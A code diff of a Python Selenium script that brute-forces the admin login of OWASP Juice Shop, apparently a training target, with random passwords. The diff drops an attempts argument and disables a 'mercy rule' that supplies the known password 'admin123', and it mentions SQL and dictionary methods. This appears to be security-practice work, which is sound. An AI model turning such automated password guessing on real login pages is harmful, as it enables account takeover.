@@ -26,11 +26,9 @@ def randomhard():
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument('-method', required=True) # valid types: sql, brute, dict
-    parser.add_argument('-attempts', nargs='?', const=10000) # make depth attempts, only for admin_brute
     parser.add_argument('-target', nargs='?', const="admin@juice-sh.op")
     args = parser.parse_args()
     method = str(args.method)
-    attempts = int(args.attempts)
     target = str(args.target)
     
     # Initialize the WebDriver
@@ -120,7 +118,6 @@ def bruteForcePassword(driver, attempts, hardness, target):
     )
     emailField.send_keys(target)
     # Open file and test each password
-    #with open("genericPasswords.txt") as f:
     for n in range(1, attempts):
         if(hardness):
             password = randomhard()
@@ -128,9 +125,9 @@ def bruteForcePassword(driver, attempts, hardness, target):
             password = randomword()
         if (n % 100 == 0):
             print(n)
-        if (n == mercy):
-            print("Mercy Rule. In actuality, it would likely take many, many hours of this to achieve results")
-            password = "admin123"
+        #if (n == mercy):
+            #print("Mercy Rule. In actuality, it would likely take many, many hours of this to achieve results")
+            #password = "admin123"
         try:
             passwordField = WebDriverWait(driver, 10).until(
                 EC.presence_of_element_located((By.ID, "password"))
